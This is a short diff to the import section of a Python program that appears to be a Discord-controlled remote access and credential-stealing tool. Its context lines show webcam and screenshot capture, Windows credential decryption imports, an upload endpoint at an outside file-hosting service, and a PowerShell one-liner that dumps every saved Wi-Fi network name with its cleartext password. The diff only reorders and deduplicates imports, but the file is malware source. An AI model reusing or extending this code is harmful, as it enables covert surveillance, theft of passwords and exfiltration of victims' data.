@@ -1,11 +1,11 @@
 import discord
 import os
-import subprocess
-import requests
 import pyautogui
 import ctypes
 import asyncio
 import sys
+import requests
+import subprocess
 from datetime import datetime
 from uuid import getnode as get_mac
 from settings import *
@@ -13,15 +13,13 @@ from cv2 import VideoCapture, imwrite, CAP_DSHOW
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 from base64 import b64decode
-from Crypto.Cipher import AES
-from win32crypt import CryptUnprotectData
 from os import getlogin, listdir
 from json import loads
 from re import findall
 from urllib.request import Request, urlopen
 from subprocess import Popen, PIPE
-import requests, json, os
-from datetime import datetime
+
+
 
 file_api = "https://api.letsupload.cc/upload"
 wifi_script = """(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize"""
